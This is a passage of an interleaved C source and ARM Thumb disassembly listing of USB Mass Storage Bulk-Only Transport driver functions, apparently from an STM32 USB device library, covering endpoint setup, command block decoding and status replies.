 800931c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009320:	2200      	movs	r2, #0
 8009322:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62

  ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Init(0U);
 8009326:	687b      	ldr	r3, [r7, #4]
 8009328:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 800932c:	687a      	ldr	r2, [r7, #4]
 800932e:	33b0      	adds	r3, #176	; 0xb0
 8009330:	009b      	lsls	r3, r3, #2
 8009332:	4413      	add	r3, r2
 8009334:	685b      	ldr	r3, [r3, #4]
 8009336:	681b      	ldr	r3, [r3, #0]
 8009338:	2000      	movs	r0, #0
 800933a:	4798      	blx	r3

  (void)USBD_LL_FlushEP(pdev, MSCOutEpAdd);
 800933c:	4b0d      	ldr	r3, [pc, #52]	; (8009374 <MSC_BOT_Init+0x9c>)
 800933e:	781b      	ldrb	r3, [r3, #0]
 8009340:	4619      	mov	r1, r3
 8009342:	6878      	ldr	r0, [r7, #4]
 8009344:	f003 fc8a 	bl	800cc5c <USBD_LL_FlushEP>
  (void)USBD_LL_FlushEP(pdev, MSCInEpAdd);
 8009348:	4b0b      	ldr	r3, [pc, #44]	; (8009378 <MSC_BOT_Init+0xa0>)
 800934a:	781b      	ldrb	r3, [r3, #0]
 800934c:	4619      	mov	r1, r3
 800934e:	6878      	ldr	r0, [r7, #4]
 8009350:	f003 fc84 	bl	800cc5c <USBD_LL_FlushEP>

  /* Prepare EP to Receive First BOT Cmd */
  (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, (uint8_t *)&hmsc->cbw,
 8009354:	4b07      	ldr	r3, [pc, #28]	; (8009374 <MSC_BOT_Init+0x9c>)
 8009356:	7819      	ldrb	r1, [r3, #0]
 8009358:	68fb      	ldr	r3, [r7, #12]
 800935a:	f503 5280 	add.w	r2, r3, #4096	; 0x1000
 800935e:	3210      	adds	r2, #16
 8009360:	231f      	movs	r3, #31
 8009362:	6878      	ldr	r0, [r7, #4]
 8009364:	f003 fdb8 	bl	800ced8 <USBD_LL_PrepareReceive>
 8009368:	e000      	b.n	800936c <MSC_BOT_Init+0x94>
    return;
 800936a:	bf00      	nop
                               USBD_BOT_CBW_LENGTH);
}
 800936c:	3710      	adds	r7, #16
 800936e:	46bd      	mov	sp, r7
 8009370:	bd80      	pop	{r7, pc}
 8009372:	bf00      	nop
 8009374:	2000010b 	.word	0x2000010b
 8009378:	2000010a 	.word	0x2000010a

0800937c <MSC_BOT_Reset>:
  *         Reset the BOT Machine
  * @param  pdev: device instance
  * @retval  None
  */
void MSC_BOT_Reset(USBD_HandleTypeDef *pdev)
{
 800937c:	b580      	push	{r7, lr}
 800937e:	b084      	sub	sp, #16
 8009380:	af00      	add	r7, sp, #0
 8009382:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009384:	687b      	ldr	r3, [r7, #4]
 8009386:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800938a:	687b      	ldr	r3, [r7, #4]
 800938c:	32b0      	adds	r2, #176	; 0xb0
 800938e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009392:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8009394:	68fb      	ldr	r3, [r7, #12]
 8009396:	2b00      	cmp	r3, #0
 8009398:	d01c      	beq.n	80093d4 <MSC_BOT_Reset+0x58>
  {
    return;
  }

  hmsc->bot_state  = USBD_BOT_IDLE;
 800939a:	68fb      	ldr	r3, [r7, #12]
 800939c:	2200      	movs	r2, #0
 800939e:	721a      	strb	r2, [r3, #8]
  hmsc->bot_status = USBD_BOT_STATUS_RECOVERY;
 80093a0:	68fb      	ldr	r3, [r7, #12]
 80093a2:	2201      	movs	r2, #1
 80093a4:	725a      	strb	r2, [r3, #9]

  (void)USBD_LL_ClearStallEP(pdev, MSCInEpAdd);
 80093a6:	4b0d      	ldr	r3, [pc, #52]	; (80093dc <MSC_BOT_Reset+0x60>)
 80093a8:	781b      	ldrb	r3, [r3, #0]
 80093aa:	4619      	mov	r1, r3
 80093ac:	6878      	ldr	r0, [r7, #4]
 80093ae:	f003 fcc1 	bl	800cd34 <USBD_LL_ClearStallEP>
  (void)USBD_LL_ClearStallEP(pdev, MSCOutEpAdd);
 80093b2:	4b0b      	ldr	r3, [pc, #44]	; (80093e0 <MSC_BOT_Reset+0x64>)
 80093b4:	781b      	ldrb	r3, [r3, #0]
 80093b6:	4619      	mov	r1, r3
 80093b8:	6878      	ldr	r0, [r7, #4]
 80093ba:	f003 fcbb 	bl	800cd34 <USBD_LL_ClearStallEP>

  /* Prepare EP to Receive First BOT Cmd */
  (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, (uint8_t *)&hmsc->cbw,
 80093be:	4b08      	ldr	r3, [pc, #32]	; (80093e0 <MSC_BOT_Reset+0x64>)
 80093c0:	7819      	ldrb	r1, [r3, #0]
 80093c2:	68fb      	ldr	r3, [r7, #12]
 80093c4:	f503 5280 	add.w	r2, r3, #4096	; 0x1000
 80093c8:	3210      	adds	r2, #16
 80093ca:	231f      	movs	r3, #31
 80093cc:	6878      	ldr	r0, [r7, #4]
 80093ce:	f003 fd83 	bl	800ced8 <USBD_LL_PrepareReceive>
 80093d2:	e000      	b.n	80093d6 <MSC_BOT_Reset+0x5a>
    return;
 80093d4:	bf00      	nop
                               USBD_BOT_CBW_LENGTH);
}
 80093d6:	3710      	adds	r7, #16
 80093d8:	46bd      	mov	sp, r7
 80093da:	bd80      	pop	{r7, pc}
 80093dc:	2000010a 	.word	0x2000010a
 80093e0:	2000010b 	.word	0x2000010b

080093e4 <MSC_BOT_DeInit>:
  *         DeInitialize the BOT Machine
  * @param  pdev: device instance
  * @retval None
  */
void MSC_BOT_DeInit(USBD_HandleTypeDef  *pdev)
{
 80093e4:	b480      	push	{r7}
 80093e6:	b085      	sub	sp, #20
 80093e8:	af00      	add	r7, sp, #0
 80093ea:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80093ec:	687b      	ldr	r3, [r7, #4]
 80093ee:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80093f2:	687b      	ldr	r3, [r7, #4]
 80093f4:	32b0      	adds	r2, #176	; 0xb0
 80093f6:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80093fa:	60fb      	str	r3, [r7, #12]

  if (hmsc != NULL)
 80093fc:	68fb      	ldr	r3, [r7, #12]
 80093fe:	2b00      	cmp	r3, #0
 8009400:	d002      	beq.n	8009408 <MSC_BOT_DeInit+0x24>
  {
    hmsc->bot_state = USBD_BOT_IDLE;
 8009402:	68fb      	ldr	r3, [r7, #12]
 8009404:	2200      	movs	r2, #0
 8009406:	721a      	strb	r2, [r3, #8]
  }
}
 8009408:	bf00      	nop
 800940a:	3714      	adds	r7, #20
 800940c:	46bd      	mov	sp, r7
 800940e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8009412:	4770      	bx	lr

08009414 <MSC_BOT_DataIn>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval None
  */
void MSC_BOT_DataIn(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 8009414:	b580      	push	{r7, lr}
 8009416:	b084      	sub	sp, #16
 8009418:	af00      	add	r7, sp, #0
 800941a:	6078      	str	r0, [r7, #4]
 800941c:	460b      	mov	r3, r1
 800941e:	70fb      	strb	r3, [r7, #3]
  UNUSED(epnum);

  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009420:	687b      	ldr	r3, [r7, #4]
 8009422:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009426:	687b      	ldr	r3, [r7, #4]
 8009428:	32b0      	adds	r2, #176	; 0xb0
 800942a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800942e:	60fb      	str	r3, [r7, #12]

  if (hmsc == NULL)
 8009430:	68fb      	ldr	r3, [r7, #12]
 8009432:	2b00      	cmp	r3, #0
 8009434:	d022      	beq.n	800947c <MSC_BOT_DataIn+0x68>
  {
    return;
  }

  switch (hmsc->bot_state)
 8009436:	68fb      	ldr	r3, [r7, #12]
 8009438:	7a1b      	ldrb	r3, [r3, #8]
 800943a:	2b02      	cmp	r3, #2
 800943c:	d005      	beq.n	800944a <MSC_BOT_DataIn+0x36>
 800943e:	2b02      	cmp	r3, #2
 8009440:	db1e      	blt.n	8009480 <MSC_BOT_DataIn+0x6c>
 8009442:	3b03      	subs	r3, #3
 8009444:	2b01      	cmp	r3, #1
 8009446:	d81b      	bhi.n	8009480 <MSC_BOT_DataIn+0x6c>
 8009448:	e013      	b.n	8009472 <MSC_BOT_DataIn+0x5e>
  {
    case USBD_BOT_DATA_IN:
      if (SCSI_ProcessCmd(pdev, hmsc->cbw.bLUN, &hmsc->cbw.CB[0]) < 0)
 800944a:	68fb      	ldr	r3, [r7, #12]
 800944c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009450:	7f59      	ldrb	r1, [r3, #29]
 8009452:	68fb      	ldr	r3, [r7, #12]
 8009454:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009458:	331f      	adds	r3, #31
 800945a:	461a      	mov	r2, r3
 800945c:	6878      	ldr	r0, [r7, #4]
 800945e:	f000 f9e5 	bl	800982c <SCSI_ProcessCmd>
 8009462:	4603      	mov	r3, r0
 8009464:	2b00      	cmp	r3, #0
 8009466:	da0d      	bge.n	8009484 <MSC_BOT_DataIn+0x70>
      {
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
 8009468:	2101      	movs	r1, #1
 800946a:	6878      	ldr	r0, [r7, #4]
 800946c:	f000 f920 	bl	80096b0 <MSC_BOT_SendCSW>
      }
      break;
 8009470:	e008      	b.n	8009484 <MSC_BOT_DataIn+0x70>

    case USBD_BOT_SEND_DATA:
    case USBD_BOT_LAST_DATA_IN:
      MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_PASSED);
 8009472:	2100      	movs	r1, #0
 8009474:	6878      	ldr	r0, [r7, #4]
 8009476:	f000 f91b 	bl	80096b0 <MSC_BOT_SendCSW>
      break;
 800947a:	e004      	b.n	8009486 <MSC_BOT_DataIn+0x72>
    return;
 800947c:	bf00      	nop
 800947e:	e002      	b.n	8009486 <MSC_BOT_DataIn+0x72>

    default:
      break;
 8009480:	bf00      	nop
 8009482:	e000      	b.n	8009486 <MSC_BOT_DataIn+0x72>
      break;
 8009484:	bf00      	nop
  }
}
 8009486:	3710      	adds	r7, #16
 8009488:	46bd      	mov	sp, r7
 800948a:	bd80      	pop	{r7, pc}

0800948c <MSC_BOT_DataOut>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval None
  */
void MSC_BOT_DataOut(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 800948c:	b580      	push	{r7, lr}
 800948e:	b084      	sub	sp, #16
 8009490:	af00      	add	r7, sp, #0
 8009492:	6078      	str	r0, [r7, #4]
 8009494:	460b      	mov	r3, r1
 8009496:	70fb      	strb	r3, [r7, #3]
  UNUSED(epnum);

  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009498:	687b      	ldr	r3, [r7, #4]
 800949a:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800949e:	687b      	ldr	r3, [r7, #4]
 80094a0:	32b0      	adds	r2, #176	; 0xb0
 80094a2:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80094a6:	60fb      	str	r3, [r7, #12]

  if (hmsc == NULL)
 80094a8:	68fb      	ldr	r3, [r7, #12]
 80094aa:	2b00      	cmp	r3, #0
 80094ac:	d01e      	beq.n	80094ec <MSC_BOT_DataOut+0x60>
  {
    return;
  }

  switch (hmsc->bot_state)
 80094ae:	68fb      	ldr	r3, [r7, #12]
 80094b0:	7a1b      	ldrb	r3, [r3, #8]
 80094b2:	2b00      	cmp	r3, #0
 80094b4:	d002      	beq.n	80094bc <MSC_BOT_DataOut+0x30>
 80094b6:	2b01      	cmp	r3, #1
 80094b8:	d004      	beq.n	80094c4 <MSC_BOT_DataOut+0x38>
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
      }
      break;

    default:
      break;
 80094ba:	e01a      	b.n	80094f2 <MSC_BOT_DataOut+0x66>
      MSC_BOT_CBW_Decode(pdev);
 80094bc:	6878      	ldr	r0, [r7, #4]
 80094be:	f000 f81b 	bl	80094f8 <MSC_BOT_CBW_Decode>
      break;
 80094c2:	e016      	b.n	80094f2 <MSC_BOT_DataOut+0x66>
      if (SCSI_ProcessCmd(pdev, hmsc->cbw.bLUN, &hmsc->cbw.CB[0]) < 0)
 80094c4:	68fb      	ldr	r3, [r7, #12]
 80094c6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80094ca:	7f59      	ldrb	r1, [r3, #29]
 80094cc:	68fb      	ldr	r3, [r7, #12]
 80094ce:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80094d2:	331f      	adds	r3, #31
 80094d4:	461a      	mov	r2, r3
 80094d6:	6878      	ldr	r0, [r7, #4]
 80094d8:	f000 f9a8 	bl	800982c <SCSI_ProcessCmd>
 80094dc:	4603      	mov	r3, r0
 80094de:	2b00      	cmp	r3, #0
 80094e0:	da06      	bge.n	80094f0 <MSC_BOT_DataOut+0x64>
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
 80094e2:	2101      	movs	r1, #1
 80094e4:	6878      	ldr	r0, [r7, #4]
 80094e6:	f000 f8e3 	bl	80096b0 <MSC_BOT_SendCSW>
      break;
 80094ea:	e001      	b.n	80094f0 <MSC_BOT_DataOut+0x64>
    return;
 80094ec:	bf00      	nop
 80094ee:	e000      	b.n	80094f2 <MSC_BOT_DataOut+0x66>
      break;
 80094f0:	bf00      	nop
  }
}
 80094f2:	3710      	adds	r7, #16
 80094f4:	46bd      	mov	sp, r7
 80094f6:	bd80      	pop	{r7, pc}

080094f8 <MSC_BOT_CBW_Decode>:
  *         Decode the CBW command and set the BOT state machine accordingly
  * @param  pdev: device instance
  * @retval None
  */
static void  MSC_BOT_CBW_Decode(USBD_HandleTypeDef *pdev)
{
 80094f8:	b580      	push	{r7, lr}
 80094fa:	b084      	sub	sp, #16
 80094fc:	af00      	add	r7, sp, #0
 80094fe:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009500:	687b      	ldr	r3, [r7, #4]
 8009502:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009506:	687b      	ldr	r3, [r7, #4]
 8009508:	32b0      	adds	r2, #176	; 0xb0
 800950a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800950e:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8009510:	68fb      	ldr	r3, [r7, #12]
 8009512:	2b00      	cmp	r3, #0
 8009514:	f000 8085 	beq.w	8009622 <MSC_BOT_CBW_Decode+0x12a>
  {
    return;
  }

  hmsc->csw.dTag = hmsc->cbw.dTag;
 8009518:	68fb      	ldr	r3, [r7, #12]
 800951a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800951e:	695b      	ldr	r3, [r3, #20]
 8009520:	68fa      	ldr	r2, [r7, #12]
 8009522:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 8009526:	6353      	str	r3, [r2, #52]	; 0x34
  hmsc->csw.dDataResidue = hmsc->cbw.dDataLength;
 8009528:	68fb      	ldr	r3, [r7, #12]
 800952a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800952e:	699b      	ldr	r3, [r3, #24]
 8009530:	68fa      	ldr	r2, [r7, #12]
 8009532:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 8009536:	6393      	str	r3, [r2, #56]	; 0x38

  if ((USBD_LL_GetRxDataSize(pdev, MSCOutEpAdd) != USBD_BOT_CBW_LENGTH) ||
 8009538:	4b3d      	ldr	r3, [pc, #244]	; (8009630 <MSC_BOT_CBW_Decode+0x138>)
 800953a:	781b      	ldrb	r3, [r3, #0]
 800953c:	4619      	mov	r1, r3
 800953e:	6878      	ldr	r0, [r7, #4]
 8009540:	f003 fd02 	bl	800cf48 <USBD_LL_GetRxDataSize>
 8009544:	4603      	mov	r3, r0
 8009546:	2b1f      	cmp	r3, #31
 8009548:	d118      	bne.n	800957c <MSC_BOT_CBW_Decode+0x84>
      (hmsc->cbw.dSignature != USBD_BOT_CBW_SIGNATURE) ||
 800954a:	68fb      	ldr	r3, [r7, #12]
 800954c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009550:	691b      	ldr	r3, [r3, #16]
  if ((USBD_LL_GetRxDataSize(pdev, MSCOutEpAdd) != USBD_BOT_CBW_LENGTH) ||
 8009552:	4a38      	ldr	r2, [pc, #224]	; (8009634 <MSC_BOT_CBW_Decode+0x13c>)
 8009554:	4293      	cmp	r3, r2
 8009556:	d111      	bne.n	800957c <MSC_BOT_CBW_Decode+0x84>
      (hmsc->cbw.bLUN > 1U) || (hmsc->cbw.bCBLength < 1U) ||
 8009558:	68fb      	ldr	r3, [r7, #12]
 800955a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800955e:	7f5b      	ldrb	r3, [r3, #29]
      (hmsc->cbw.dSignature != USBD_BOT_CBW_SIGNATURE) ||
 8009560:	2b01      	cmp	r3, #1
 8009562:	d80b      	bhi.n	800957c <MSC_BOT_CBW_Decode+0x84>
      (hmsc->cbw.bLUN > 1U) || (hmsc->cbw.bCBLength < 1U) ||
 8009564:	68fb      	ldr	r3, [r7, #12]
 8009566:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800956a:	7f9b      	ldrb	r3, [r3, #30]
 800956c:	2b00      	cmp	r3, #0
 800956e:	d005      	beq.n	800957c <MSC_BOT_CBW_Decode+0x84>
      (hmsc->cbw.bCBLength > 16U))
 8009570:	68fb      	ldr	r3, [r7, #12]
 8009572:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009576:	7f9b      	ldrb	r3, [r3, #30]
      (hmsc->cbw.bLUN > 1U) || (hmsc->cbw.bCBLength < 1U) ||
 8009578:	2b10      	cmp	r3, #16
 800957a:	d90f      	bls.n	800959c <MSC_BOT_CBW_Decode+0xa4>
  {
    SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 800957c:	68fb      	ldr	r3, [r7, #12]
 800957e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009582:	7f59      	ldrb	r1, [r3, #29]
 8009584:	2320      	movs	r3, #32
 8009586:	2205      	movs	r2, #5
 8009588:	6878      	ldr	r0, [r7, #4]
 800958a:	f000 fe7b 	bl	800a284 <SCSI_SenseCode>

    hmsc->bot_status = USBD_BOT_STATUS_ERROR;
 800958e:	68fb      	ldr	r3, [r7, #12]
 8009590:	2202      	movs	r2, #2
 8009592:	725a      	strb	r2, [r3, #9]
    MSC_BOT_Abort(pdev);
 8009594:	6878      	ldr	r0, [r7, #4]
 8009596:	f000 f8cb 	bl	8009730 <MSC_BOT_Abort>
 800959a:	e045      	b.n	8009628 <MSC_BOT_CBW_Decode+0x130>
  }
  else
  {
    if (SCSI_ProcessCmd(pdev, hmsc->cbw.bLUN, &hmsc->cbw.CB[0]) < 0)
 800959c:	68fb      	ldr	r3, [r7, #12]
 800959e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80095a2:	7f59      	ldrb	r1, [r3, #29]
 80095a4:	68fb      	ldr	r3, [r7, #12]
 80095a6:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80095aa:	331f      	adds	r3, #31
 80095ac:	461a      	mov	r2, r3
 80095ae:	6878      	ldr	r0, [r7, #4]
 80095b0:	f000 f93c 	bl	800982c <SCSI_ProcessCmd>
 80095b4:	4603      	mov	r3, r0
 80095b6:	2b00      	cmp	r3, #0
 80095b8:	da0c      	bge.n	80095d4 <MSC_BOT_CBW_Decode+0xdc>
    {
      if (hmsc->bot_state == USBD_BOT_NO_DATA)
 80095ba:	68fb      	ldr	r3, [r7, #12]
 80095bc:	7a1b      	ldrb	r3, [r3, #8]
 80095be:	2b05      	cmp	r3, #5
 80095c0:	d104      	bne.n	80095cc <MSC_BOT_CBW_Decode+0xd4>
      {
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
 80095c2:	2101      	movs	r1, #1
 80095c4:	6878      	ldr	r0, [r7, #4]
 80095c6:	f000 f873 	bl	80096b0 <MSC_BOT_SendCSW>
 80095ca:	e02d      	b.n	8009628 <MSC_BOT_CBW_Decode+0x130>
      }
      else
      {
        MSC_BOT_Abort(pdev);
 80095cc:	6878      	ldr	r0, [r7, #4]
 80095ce:	f000 f8af 	bl	8009730 <MSC_BOT_Abort>
 80095d2:	e029      	b.n	8009628 <MSC_BOT_CBW_Decode+0x130>
      }
    }
    /* Burst xfer handled internally */
    else if ((hmsc->bot_state != USBD_BOT_DATA_IN) &&
 80095d4:	68fb      	ldr	r3, [r7, #12]
 80095d6:	7a1b      	ldrb	r3, [r3, #8]
 80095d8:	2b02      	cmp	r3, #2
 80095da:	d024      	beq.n	8009626 <MSC_BOT_CBW_Decode+0x12e>
             (hmsc->bot_state != USBD_BOT_DATA_OUT) &&
 80095dc:	68fb      	ldr	r3, [r7, #12]
 80095de:	7a1b      	ldrb	r3, [r3, #8]
    else if ((hmsc->bot_state != USBD_BOT_DATA_IN) &&
 80095e0:	2b01      	cmp	r3, #1
 80095e2:	d020      	beq.n	8009626 <MSC_BOT_CBW_Decode+0x12e>
             (hmsc->bot_state != USBD_BOT_LAST_DATA_IN))
 80095e4:	68fb      	ldr	r3, [r7, #12]
 80095e6:	7a1b      	ldrb	r3, [r3, #8]
             (hmsc->bot_state != USBD_BOT_DATA_OUT) &&
 80095e8:	2b03      	cmp	r3, #3
 80095ea:	d01c      	beq.n	8009626 <MSC_BOT_CBW_Decode+0x12e>
    {
      if (hmsc->bot_data_length > 0U)
 80095ec:	68fb      	ldr	r3, [r7, #12]
 80095ee:	68db      	ldr	r3, [r3, #12]
 80095f0:	2b00      	cmp	r3, #0
 80095f2:	d009      	beq.n	8009608 <MSC_BOT_CBW_Decode+0x110>
      {
        MSC_BOT_SendData(pdev, hmsc->bot_data, hmsc->bot_data_length);
 80095f4:	68fb      	ldr	r3, [r7, #12]
 80095f6:	f103 0110 	add.w	r1, r3, #16
 80095fa:	68fb      	ldr	r3, [r7, #12]
 80095fc:	68db      	ldr	r3, [r3, #12]
 80095fe:	461a      	mov	r2, r3
 8009600:	6878      	ldr	r0, [r7, #4]
 8009602:	f000 f819 	bl	8009638 <MSC_BOT_SendData>
      if (hmsc->bot_data_length > 0U)
 8009606:	e00f      	b.n	8009628 <MSC_BOT_CBW_Decode+0x130>
      }
      else if (hmsc->bot_data_length == 0U)
 8009608:	68fb      	ldr	r3, [r7, #12]
 800960a:	68db      	ldr	r3, [r3, #12]
 800960c:	2b00      	cmp	r3, #0
 800960e:	d104      	bne.n	800961a <MSC_BOT_CBW_Decode+0x122>
      {
        MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_PASSED);
 8009610:	2100      	movs	r1, #0
 8009612:	6878      	ldr	r0, [r7, #4]
 8009614:	f000 f84c 	bl	80096b0 <MSC_BOT_SendCSW>
      if (hmsc->bot_data_length > 0U)
 8009618:	e006      	b.n	8009628 <MSC_BOT_CBW_Decode+0x130>
      }
      else
      {
        MSC_BOT_Abort(pdev);
 800961a:	6878      	ldr	r0, [r7, #4]
 800961c:	f000 f888 	bl	8009730 <MSC_BOT_Abort>
      if (hmsc->bot_data_length > 0U)
 8009620:	e002      	b.n	8009628 <MSC_BOT_CBW_Decode+0x130>
    return;
 8009622:	bf00      	nop
 8009624:	e000      	b.n	8009628 <MSC_BOT_CBW_Decode+0x130>
      }
    }
    else
    {
      return;
 8009626:	bf00      	nop
    }
  }
}
 8009628:	3710      	adds	r7, #16
 800962a:	46bd      	mov	sp, r7
 800962c:	bd80      	pop	{r7, pc}
 800962e:	bf00      	nop
 8009630:	2000010b 	.word	0x2000010b
 8009634:	43425355 	.word	0x43425355

08009638 <MSC_BOT_SendData>:
  * @param  buf: pointer to data buffer
  * @param  len: Data Length
  * @retval None
  */
static void  MSC_BOT_SendData(USBD_HandleTypeDef *pdev, uint8_t *pbuf, uint32_t len)
{
 8009638:	b580      	push	{r7, lr}
 800963a:	b086      	sub	sp, #24
 800963c:	af00      	add	r7, sp, #0
 800963e:	60f8      	str	r0, [r7, #12]
 8009640:	60b9      	str	r1, [r7, #8]
 8009642:	607a      	str	r2, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009644:	68fb      	ldr	r3, [r7, #12]
 8009646:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800964a:	68fb      	ldr	r3, [r7, #12]
 800964c:	32b0      	adds	r2, #176	; 0xb0
 800964e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009652:	617b      	str	r3, [r7, #20]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8009654:	697b      	ldr	r3, [r7, #20]
 8009656:	2b00      	cmp	r3, #0
 8009658:	d023      	beq.n	80096a2 <MSC_BOT_SendData+0x6a>
  {
    return;
  }

  length = MIN(hmsc->cbw.dDataLength, len);
 800965a:	697b      	ldr	r3, [r7, #20]
 800965c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009660:	699b      	ldr	r3, [r3, #24]
 8009662:	687a      	ldr	r2, [r7, #4]
 8009664:	4293      	cmp	r3, r2
 8009666:	bf28      	it	cs
 8009668:	4613      	movcs	r3, r2
 800966a:	613b      	str	r3, [r7, #16]

  hmsc->csw.dDataResidue -= len;
 800966c:	697b      	ldr	r3, [r7, #20]
 800966e:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009672:	6b9a      	ldr	r2, [r3, #56]	; 0x38
 8009674:	687b      	ldr	r3, [r7, #4]
 8009676:	1ad3      	subs	r3, r2, r3
 8009678:	697a      	ldr	r2, [r7, #20]
 800967a:	f502 5280 	add.w	r2, r2, #4096	; 0x1000
 800967e:	6393      	str	r3, [r2, #56]	; 0x38
  hmsc->csw.bStatus = USBD_CSW_CMD_PASSED;
 8009680:	697b      	ldr	r3, [r7, #20]
 8009682:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009686:	2200      	movs	r2, #0
 8009688:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c
  hmsc->bot_state = USBD_BOT_SEND_DATA;
 800968c:	697b      	ldr	r3, [r7, #20]
 800968e:	2204      	movs	r2, #4
 8009690:	721a      	strb	r2, [r3, #8]

  (void)USBD_LL_Transmit(pdev, MSCInEpAdd, pbuf, length);
 8009692:	4b06      	ldr	r3, [pc, #24]	; (80096ac <MSC_BOT_SendData+0x74>)
 8009694:	7819      	ldrb	r1, [r3, #0]
 8009696:	693b      	ldr	r3, [r7, #16]
 8009698:	68ba      	ldr	r2, [r7, #8]
 800969a:	68f8      	ldr	r0, [r7, #12]
 800969c:	f003 fbe4 	bl	800ce68 <USBD_LL_Transmit>
 80096a0:	e000      	b.n	80096a4 <MSC_BOT_SendData+0x6c>
    return;
 80096a2:	bf00      	nop
}
 80096a4:	3718      	adds	r7, #24
 80096a6:	46bd      	mov	sp, r7
 80096a8:	bd80      	pop	{r7, pc}
 80096aa:	bf00      	nop
 80096ac:	2000010a 	.word	0x2000010a

080096b0 <MSC_BOT_SendCSW>:
  * @param  pdev: device instance
  * @param  status : CSW status
  * @retval None
  */
void  MSC_BOT_SendCSW(USBD_HandleTypeDef *pdev, uint8_t CSW_Status)
{
 80096b0:	b580      	push	{r7, lr}
 80096b2:	b084      	sub	sp, #16
 80096b4:	af00      	add	r7, sp, #0
 80096b6:	6078      	str	r0, [r7, #4]
 80096b8:	460b      	mov	r3, r1
 80096ba:	70fb      	strb	r3, [r7, #3]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
